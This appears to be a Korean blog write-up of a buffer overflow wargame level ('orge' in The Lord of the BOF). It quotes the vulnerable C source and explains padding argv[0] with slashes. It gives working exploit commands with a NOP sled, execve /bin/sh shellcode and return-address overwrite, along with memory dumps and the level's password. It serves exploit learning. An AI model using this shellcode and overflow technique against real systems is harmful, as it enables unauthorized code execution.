---
title: "BOF - Lv.7 darkelf"
excerpt: "Lv.7 darkelf"
toc: true
toc_sticky: true
categories:
  - BOF
tags:
  - buffer overflow
---

## 1. Source Code
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```
## 2. Vulnerability
wolfman과 다른점은 코드를 보면 argv[0]의 길이가 77이어야 한다. argv[0]은 파일경로임. argv[0]을 출력해보려고 file 실행파일을 만들어서 보니 argv[0]: ./file 이라고 나옴.  
그런데 Linux에서는 .////////file 이렇게 해도 실행이 되고 argv[0]도 그럼 .////////file 이렇게 나올거임. 이를 이용해서 문제를 해결.

## 3. Solution
.+'/'*72+orge(5)=77 -> .////////////////////////////////////////////////////////////////////////orge  
우선 test파일을 만들어서 argv[2] 주소를 보면 0xbffffb24부터 값이 들어가 있음. 리턴주소로 0xbffffb30으로 하겠음.
```
.////////////////////////////////////////////////////////////////////////test `python -c 'print "A"*44+"BBB\xbf"'` `python -c 'print "C"*100'`
0xbffffaf0:     0x00747365      0x41414141      0x41414141      0x41414141
0xbffffb00:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb10:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb20:     0xbf424242      0x43434300      0x43434343      0x43434343
0xbffffb30:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffb40:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffb50:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffb60:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffb70:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffb80:     0x43434343      0x43434343      0x00000043      0x00000000
0xbffffb90:     0x00000000      0x00000000      0x00000000      0x00000000
``` 
Segmentation fault (core dump)가 되서 다시 확인해보니 리턴주소가 달라져서 다시 설정함. 0xbffffb3c
```
.////////////////////////////////////////////////////////////////////////test `python -c 'print "A"*44+"\x80\xfb\xff\xbf"'` `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
0xbffffacc:     0x2f2f2f2f      0x2f2f2f2f      0x65742f2f      0x41007473
0xbffffadc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffaec:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffafc:     0x41414141      0x41414141      0x80414141      0x00bffffb
0xbffffb0c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb1c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb2c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb3c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb4c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb5c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb6c:     0x90909090      0x6850c031      0x68732f2f      0x69622f68
```
바꾼 주소로 해보니 잘 되서 실제파일에도 공격해서 성공.
```
.////////////////////////////////////////////////////////////////////////orge `python -c 'print "A"*44+"\x3c\xfb\xff\xbf"'` `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<▒▒▒
bash$ my-pass
euid = 507
timewalker
```
my-pass : timewalker